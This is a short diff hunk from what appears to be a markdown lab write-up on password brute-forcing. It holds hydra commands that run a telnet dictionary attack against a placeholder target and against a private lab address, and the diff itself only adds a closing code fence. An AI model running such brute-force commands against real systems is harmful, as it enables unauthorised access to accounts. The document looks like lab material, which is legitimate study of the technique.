@@ -113,7 +113,7 @@ and
   hydra -l userlist.txt -P mypass.txt telnet:// <TARGET_IP> -t 4 -vV -w 3
  
 hydra -l userlist.txt -P mypass.txt telnet://192.168.111.128 -t 4 -vV -w 3
-
+```
 
 ![alt text](screenshots/image-28.png)
 
